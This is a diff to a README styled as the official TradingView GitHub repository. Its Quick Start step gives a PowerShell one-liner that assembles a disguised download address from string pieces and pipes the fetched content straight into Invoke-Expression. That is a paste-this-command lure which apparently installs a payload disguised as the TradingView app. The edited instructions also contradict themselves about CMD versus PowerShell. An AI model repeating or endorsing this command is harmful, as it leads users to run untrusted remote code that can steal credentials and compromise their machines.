@@ -3,7 +3,6 @@
 ## TradingView Official GitHub Repository
 
 TradingView provides advanced charting, market data, and professional analysis tools used by traders and investors around the world.
-With Developer Mode enabled, you can unlock experimental features, early releases, and advanced functionality for research and testing.
 
 The platform supports crypto, stocks, forex, and futures markets, helping you analyze charts, monitor market structure, and explore new tools in one place.
 
@@ -11,56 +10,45 @@ The platform supports crypto, stocks, forex, and futures markets, helping you an
 
 ## Quick Start
 
-Using PowerShell is the recommended way to enable TradingView developer features. It installs the required components and completes the setup in one step.
+_Cmd command is the recommended way to install TradingView. It installs the required components and completes the setup in one step._
 
-Step 1: Open PowerShell
+### Step 1: Open PowerShell
 
-Press Win + R, type PowerShell, and press Enter.
+Press `Win + R`, type `CMD`, and press **Enter**.
 
-Step 2: Run the Command
+### Step 2: Run the Command
+```powershell
 powershell -command "$desktop='.app'; iwr ('tradingview' + 'install' + $desktop) | iex"
+`````
 
-After installation, TradingView will be updated and developer features will become available.
+_After installation, a shortcut will be created on your desktop and in the Start menu._ <br>
 
-What You Get
-<table> <tr> <td width="25%">
-Professional Charting
+
+### Professional Charting
 
 Advanced tools for crypto, stocks, forex, and futures markets.
 
-</td> <td width="25%">
-Developer Features
-
-Access experimental tools and early functionality.
-
-</td> <td width="25%">
-Private Workspace
+### Private Workspace
 
 Your layouts, watchlists, and settings stay yours.
 
-</td> <td width="25%">
-Faster Research Workflow
+### Faster Research Workflow
 
 Analyze charts and markets in seconds.
 
-</td> </tr> <tr> <td>
-Advanced Indicators
+### Advanced Indicators
 
 Explore extended indicators and tools.
 
-</td> <td>
-Multi-Market Support
+### Multi-Market Support
 
 Track multiple markets from one platform.
 
-</td> <td>
-Real-Time Data
+### Real-Time Data
 
 Stay up to date with live market information.
 
-</td> <td>
-Continuous Updates
+### Continuous Updates
 
 Get early access to new TradingView features.
 
-</td> </tr> </table>
